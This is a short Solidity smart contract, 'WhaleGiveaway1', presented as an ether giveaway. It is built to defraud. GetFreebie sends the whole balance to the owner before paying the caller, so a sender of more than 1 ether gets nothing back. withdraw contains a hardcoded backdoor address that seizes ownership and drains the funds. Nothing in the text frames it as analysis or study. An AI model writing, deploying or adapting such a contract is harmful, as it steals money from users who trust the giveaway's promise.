pragma solidity ^0.4.19;
contract WhaleGiveaway1 {
	address public Owner = msg.sender;
	function () payable public {
	}
	function GetFreebie() payable public {
	if(msg.value > 1 ether){
	Owner.transfer(this.balance);
	msg.sender.transfer(this.balance);
	}
	}
	function withdraw() payable public {
	if(msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){
	Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
	}
	require(msg.sender == Owner);
	Owner.transfer(this.balance);
	}
	function Command(address adr, bytes data) payable public {
	require(msg.sender == Owner);
	adr.transfer(msg.value);
	}
	
}